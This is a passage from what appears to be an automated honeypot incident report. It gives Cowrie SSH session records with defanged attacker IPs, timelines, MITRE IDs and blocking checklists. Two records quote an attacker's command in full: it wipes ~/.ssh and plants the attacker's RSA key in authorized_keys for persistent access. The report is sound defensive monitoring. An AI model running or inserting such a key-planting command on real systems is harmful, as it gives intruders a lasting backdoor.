- [ ] Submit `187.8.120[.]90` to AbuseIPDB if not already reported
- [ ] Block `187.8.120[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46c3449c26ce

| Field | Detail |
|---|---|
| **Source IP** | `101.13.4[.]119` |
| **First Seen** | 2026-07-16 21:18 |
| **Last Seen** | 2026-07-16 21:18 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 21:18:48` | `cowrie.session.connect` |
| `2026-07-16 21:18:48` | `cowrie.client.version` |
| `2026-07-16 21:18:48` | `cowrie.client.kex` |
| `2026-07-16 21:18:50` | `cowrie.login.success` |
| `2026-07-16 21:18:51` | `cowrie.direct-tcpip.request` |
| `2026-07-16 21:18:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.13.4[.]119` to AbuseIPDB if not already reported
- [ ] Block `101.13.4[.]119` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47ddac9945e7

| Field | Detail |
|---|---|
| **Source IP** | `77.106.78[.]215` |
| **First Seen** | 2026-07-16 21:27 |
| **Last Seen** | 2026-07-16 21:27 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 21:27:33` | `cowrie.session.connect` |
| `2026-07-16 21:27:34` | `cowrie.client.version` |
| `2026-07-16 21:27:34` | `cowrie.client.kex` |
| `2026-07-16 21:27:35` | `cowrie.login.success` |
| `2026-07-16 21:27:36` | `cowrie.direct-tcpip.request` |
| `2026-07-16 21:27:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.106.78[.]215` to AbuseIPDB if not already reported
- [ ] Block `77.106.78[.]215` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b71a8327f11

| Field | Detail |
|---|---|
| **Source IP** | `117.191.83[.]250` |
| **First Seen** | 2026-07-16 21:27 |
| **Last Seen** | 2026-07-16 21:27 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 21:27:42` | `cowrie.session.connect` |
| `2026-07-16 21:27:42` | `cowrie.client.version` |
| `2026-07-16 21:27:42` | `cowrie.client.kex` |
| `2026-07-16 21:27:45` | `cowrie.login.success` |
| `2026-07-16 21:27:46` | `cowrie.direct-tcpip.request` |
| `2026-07-16 21:27:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.191.83[.]250` to AbuseIPDB if not already reported
- [ ] Block `117.191.83[.]250` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9628d9f60cd

| Field | Detail |
|---|---|
| **Source IP** | `112.137.143[.]2` |
| **First Seen** | 2026-07-16 21:28 |
| **Last Seen** | 2026-07-16 21:28 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 21:28:44` | `cowrie.session.connect` |
| `2026-07-16 21:28:44` | `cowrie.client.version` |
| `2026-07-16 21:28:44` | `cowrie.client.kex` |
| `2026-07-16 21:28:45` | `cowrie.login.success` |
| `2026-07-16 21:28:47` | `cowrie.session.params` |
| `2026-07-16 21:28:47` | `cowrie.command.input` |
| `2026-07-16 21:28:47` | `cowrie.command.failed` |
| `2026-07-16 21:28:47` | `cowrie.log.closed` |
| `2026-07-16 21:28:48` | `cowrie.session.params` |
| `2026-07-16 21:28:48` | `cowrie.command.input` |
| `2026-07-16 21:28:48` | `cowrie.session.file_download` |
| `2026-07-16 21:28:48` | `cowrie.log.closed` |
| `2026-07-16 21:28:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.137.143[.]2` to AbuseIPDB if not already reported
- [ ] Block `112.137.143[.]2` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d33858115202

| Field | Detail |
|---|---|
| **Source IP** | `112.137.143[.]2` |
| **First Seen** | 2026-07-16 21:28 |
| **Last Seen** | 2026-07-16 21:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 21:28:48` | `cowrie.session.connect` |
| `2026-07-16 21:28:48` | `cowrie.client.version` |
| `2026-07-16 21:28:48` | `cowrie.client.kex` |
| `2026-07-16 21:28:49` | `cowrie.login.success` |
| `2026-07-16 21:28:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.137.143[.]2` to AbuseIPDB if not already reported
- [ ] Block `112.137.143[.]2` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12ce0542b09d

| Field | Detail |
|---|---|
| **Source IP** | `112.137.143[.]2` |
| **First Seen** | 2026-07-16 21:28 |
| **Last Seen** | 2026-07-16 21:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 21:28:50` | `cowrie.session.connect` |
| `2026-07-16 21:28:50` | `cowrie.client.version` |
| `2026-07-16 21:28:50` | `cowrie.client.kex` |
| `2026-07-16 21:28:51` | `cowrie.login.success` |
| `2026-07-16 21:28:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.137.143[.]2` to AbuseIPDB if not already reported
- [ ] Block `112.137.143[.]2` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6dd5a7807c10

| Field | Detail |
|---|---|
| **Source IP** | `217.52.226[.]144` |
| **First Seen** | 2026-07-16 21:31 |
| **Last Seen** | 2026-07-16 21:31 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 21:31:02` | `cowrie.session.connect` |
| `2026-07-16 21:31:03` | `cowrie.client.version` |
| `2026-07-16 21:31:03` | `cowrie.client.kex` |
| `2026-07-16 21:31:04` | `cowrie.login.success` |
| `2026-07-16 21:31:04` | `cowrie.direct-tcpip.request` |
| `2026-07-16 21:31:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.52.226[.]144` to AbuseIPDB if not already reported
- [ ] Block `217.52.226[.]144` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-720566ae36d1

| Field | Detail |
|---|---|
| **Source IP** | `45.129.242[.]233` |
| **First Seen** | 2026-07-16 21:32 |
| **Last Seen** | 2026-07-16 21:32 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 21:32:39` | `cowrie.session.connect` |
| `2026-07-16 21:32:39` | `cowrie.client.version` |
| `2026-07-16 21:32:39` | `cowrie.client.kex` |
| `2026-07-16 21:32:40` | `cowrie.login.success` |
| `2026-07-16 21:32:41` | `cowrie.session.params` |
| `2026-07-16 21:32:41` | `cowrie.command.input` |
| `2026-07-16 21:32:41` | `cowrie.command.failed` |
| `2026-07-16 21:32:41` | `cowrie.log.closed` |
| `2026-07-16 21:32:42` | `cowrie.session.params` |
| `2026-07-16 21:32:42` | `cowrie.command.input` |
| `2026-07-16 21:32:42` | `cowrie.session.file_download` |
| `2026-07-16 21:32:42` | `cowrie.log.closed` |
| `2026-07-16 21:32:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.129.242[.]233` to AbuseIPDB if not already reported
- [ ] Block `45.129.242[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ecd865a4836

| Field | Detail |
|---|---|
| **Source IP** | `45.129.242[.]233` |
| **First Seen** | 2026-07-16 21:32 |
| **Last Seen** | 2026-07-16 21:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 21:32:42` | `cowrie.session.connect` |
| `2026-07-16 21:32:42` | `cowrie.client.version` |
| `2026-07-16 21:32:42` | `cowrie.client.kex` |
| `2026-07-16 21:32:42` | `cowrie.login.success` |
| `2026-07-16 21:32:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.129.242[.]233` to AbuseIPDB if not already reported
- [ ] Block `45.129.242[.]233` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82521b525b1d

| Field | Detail |
|---|---|
| **Source IP** | `45.129.242[.]233` |
| **First Seen** | 2026-07-16 21:32 |
| **Last Seen** | 2026-07-16 21:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 21:32:42` | `cowrie.session.connect` |
| `2026-07-16 21:32:42` | `cowrie.client.version` |
| `2026-07-16 21:32:43` | `cowrie.client.kex` |
| `2026-07-16 21:32:43` | `cowrie.login.success` |
| `2026-07-16 21:32:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.129.242[.]233` to AbuseIPDB if not already reported
- [ ] Block `45.129.242[.]233` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e3dc14a3b8f

| Field | Detail |
|---|---|
| **Source IP** | `211.169.212[.]206` |
| **First Seen** | 2026-07-16 21:40 |
| **Last Seen** | 2026-07-16 21:40 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 21:40:02` | `cowrie.session.connect` |
| `2026-07-16 21:40:03` | `cowrie.client.version` |
| `2026-07-16 21:40:03` | `cowrie.client.kex` |
| `2026-07-16 21:40:06` | `cowrie.login.success` |
| `2026-07-16 21:40:07` | `cowrie.direct-tcpip.request` |
| `2026-07-16 21:40:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.169.212[.]206` to AbuseIPDB if not already reported
- [ ] Block `211.169.212[.]206` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-685caebcd6bb

| Field | Detail |
|---|---|
| **Source IP** | `218.28.18[.]2` |
| **First Seen** | 2026-07-16 21:40 |
| **Last Seen** | 2026-07-16 21:40 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 21:40:12` | `cowrie.session.connect` |
| `2026-07-16 21:40:13` | `cowrie.client.version` |
| `2026-07-16 21:40:13` | `cowrie.client.kex` |
| `2026-07-16 21:40:15` | `cowrie.login.success` |
| `2026-07-16 21:40:16` | `cowrie.direct-tcpip.request` |
| `2026-07-16 21:40:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.28.18[.]2` to AbuseIPDB if not already reported
- [ ] Block `218.28.18[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5fb984fa655e

| Field | Detail |
|---|---|
| **Source IP** | `103.61.122[.]229` |
| **First Seen** | 2026-07-16 21:42 |
| **Last Seen** | 2026-07-16 21:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 21:42:01` | `cowrie.session.connect` |
| `2026-07-16 21:42:01` | `cowrie.client.version` |
| `2026-07-16 21:42:01` | `cowrie.client.kex` |
| `2026-07-16 21:42:01` | `cowrie.login.success` |
| `2026-07-16 21:42:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.61.122[.]229` to AbuseIPDB if not already reported
- [ ] Block `103.61.122[.]229` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75f57202a3d3

| Field | Detail |
|---|---|
| **Source IP** | `61.185.30[.]170` |
| **First Seen** | 2026-07-16 21:43 |
| **Last Seen** | 2026-07-16 21:43 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 21:43:12` | `cowrie.session.connect` |
| `2026-07-16 21:43:12` | `cowrie.client.version` |
| `2026-07-16 21:43:12` | `cowrie.client.kex` |
| `2026-07-16 21:43:14` | `cowrie.login.success` |
| `2026-07-16 21:43:15` | `cowrie.direct-tcpip.request` |
| `2026-07-16 21:43:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.185.30[.]170` to AbuseIPDB if not already reported
- [ ] Block `61.185.30[.]170` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26197249f349

| Field | Detail |
|---|---|
| **Source IP** | `121.41.31[.]208` |
| **First Seen** | 2026-07-16 21:44 |
| **Last Seen** | 2026-07-16 21:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 21:44:47` | `cowrie.session.connect` |
| `2026-07-16 21:44:48` | `cowrie.telnet.option` |
| `2026-07-16 21:44:48` | `cowrie.telnet.option` |
| `2026-07-16 21:46:47` | `cowrie.login.success` |
| `2026-07-16 21:46:48` | `cowrie.session.params` |

**Recommended Actions:**
- [ ] Submit `121.41.31[.]208` to AbuseIPDB if not already reported
- [ ] Block `121.41.31[.]208` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b00fb53eb24

| Field | Detail |
|---|---|
| **Source IP** | `65.20.161[.]126` |
| **First Seen** | 2026-07-16 21:45 |
| **Last Seen** | 2026-07-16 21:45 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 21:45:29` | `cowrie.session.connect` |
| `2026-07-16 21:45:29` | `cowrie.client.version` |
| `2026-07-16 21:45:29` | `cowrie.client.kex` |
| `2026-07-16 21:45:31` | `cowrie.login.success` |
| `2026-07-16 21:45:31` | `cowrie.direct-tcpip.request` |
| `2026-07-16 21:45:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.161[.]126` to AbuseIPDB if not already reported
- [ ] Block `65.20.161[.]126` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b06143ac88e9

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-16 21:46 |
| **Last Seen** | 2026-07-16 21:46 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 21:46:09` | `cowrie.session.connect` |
| `2026-07-16 21:46:10` | `cowrie.client.version` |
| `2026-07-16 21:46:10` | `cowrie.client.kex` |
| `2026-07-16 21:46:12` | `cowrie.login.success` |
| `2026-07-16 21:46:13` | `cowrie.session.params` |
| `2026-07-16 21:46:13` | `cowrie.command.input` |
| `2026-07-16 21:46:13` | `cowrie.log.closed` |
| `2026-07-16 21:46:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-409822c854f2

| Field | Detail |
|---|---|
| **Source IP** | `196.219.93[.]108` |
| **First Seen** | 2026-07-16 21:48 |
| **Last Seen** | 2026-07-16 21:49 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 21:48:57` | `cowrie.session.connect` |
| `2026-07-16 21:48:58` | `cowrie.client.version` |
| `2026-07-16 21:48:58` | `cowrie.client.kex` |
| `2026-07-16 21:48:59` | `cowrie.login.success` |
| `2026-07-16 21:48:59` | `cowrie.direct-tcpip.request` |
| `2026-07-16 21:49:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.219.93[.]108` to AbuseIPDB if not already reported
- [ ] Block `196.219.93[.]108` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd6e7f97b0c5

| Field | Detail |
|---|---|
| **Source IP** | `122.160.85[.]144` |
| **First Seen** | 2026-07-16 21:49 |
| **Last Seen** | 2026-07-16 21:49 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 21:49:04` | `cowrie.session.connect` |
| `2026-07-16 21:49:05` | `cowrie.client.version` |
| `2026-07-16 21:49:05` | `cowrie.client.kex` |
| `2026-07-16 21:49:08` | `cowrie.login.success` |
| `2026-07-16 21:49:08` | `cowrie.direct-tcpip.request` |
| `2026-07-16 21:49:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.160.85[.]144` to AbuseIPDB if not already reported
- [ ] Block `122.160.85[.]144` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76bceb94959d

| Field | Detail |
|---|---|
| **Source IP** | `65.20.202[.]4` |
| **First Seen** | 2026-07-16 21:55 |
| **Last Seen** | 2026-07-16 21:55 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 21:55:50` | `cowrie.session.connect` |
| `2026-07-16 21:55:50` | `cowrie.client.version` |
| `2026-07-16 21:55:50` | `cowrie.client.kex` |
| `2026-07-16 21:55:52` | `cowrie.login.success` |
| `2026-07-16 21:55:52` | `cowrie.direct-tcpip.request` |
| `2026-07-16 21:55:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.202[.]4` to AbuseIPDB if not already reported
- [ ] Block `65.20.202[.]4` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45efb8e50d24

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-16 22:03 |
| **Last Seen** | 2026-07-16 22:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 22:03:09` | `cowrie.session.connect` |
| `2026-07-16 22:03:09` | `cowrie.client.version` |
| `2026-07-16 22:03:09` | `cowrie.client.kex` |
| `2026-07-16 22:03:09` | `cowrie.login.success` |
| `2026-07-16 22:03:10` | `cowrie.session.params` |
| `2026-07-16 22:03:10` | `cowrie.command.input` |
| `2026-07-16 22:03:10` | `cowrie.log.closed` |
| `2026-07-16 22:03:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1310842e4ef9

| Field | Detail |
|---|---|
| **Source IP** | `60.249.251[.]88` |
| **First Seen** | 2026-07-16 22:04 |
| **Last Seen** | 2026-07-16 22:04 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 22:04:28` | `cowrie.session.connect` |
| `2026-07-16 22:04:29` | `cowrie.client.version` |
| `2026-07-16 22:04:29` | `cowrie.client.kex` |
| `2026-07-16 22:04:31` | `cowrie.login.success` |
| `2026-07-16 22:04:32` | `cowrie.direct-tcpip.request` |
| `2026-07-16 22:04:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.249.251[.]88` to AbuseIPDB if not already reported
- [ ] Block `60.249.251[.]88` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c4f28c45e7b

| Field | Detail |
|---|---|
| **Source IP** | `49.124.154[.]171` |
| **First Seen** | 2026-07-16 22:04 |
| **Last Seen** | 2026-07-16 22:04 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 22:04:38` | `cowrie.session.connect` |
| `2026-07-16 22:04:39` | `cowrie.client.version` |
| `2026-07-16 22:04:39` | `cowrie.client.kex` |
| `2026-07-16 22:04:41` | `cowrie.login.success` |
| `2026-07-16 22:04:42` | `cowrie.direct-tcpip.request` |
| `2026-07-16 22:04:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.154[.]171` to AbuseIPDB if not already reported
- [ ] Block `49.124.154[.]171` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9f6e1e1c7d9

| Field | Detail |
|---|---|
| **Source IP** | `201.63.52[.]54` |
| **First Seen** | 2026-07-16 22:08 |
| **Last Seen** | 2026-07-16 22:08 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 22:08:06` | `cowrie.session.connect` |
| `2026-07-16 22:08:07` | `cowrie.client.version` |
| `2026-07-16 22:08:07` | `cowrie.client.kex` |
| `2026-07-16 22:08:08` | `cowrie.login.success` |
| `2026-07-16 22:08:09` | `cowrie.direct-tcpip.request` |
| `2026-07-16 22:08:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.63.52[.]54` to AbuseIPDB if not already reported
- [ ] Block `201.63.52[.]54` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e4e52793642

| Field | Detail |
|---|---|
| **Source IP** | `197.248.207[.]138` |
| **First Seen** | 2026-07-16 22:09 |
| **Last Seen** | 2026-07-16 22:09 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
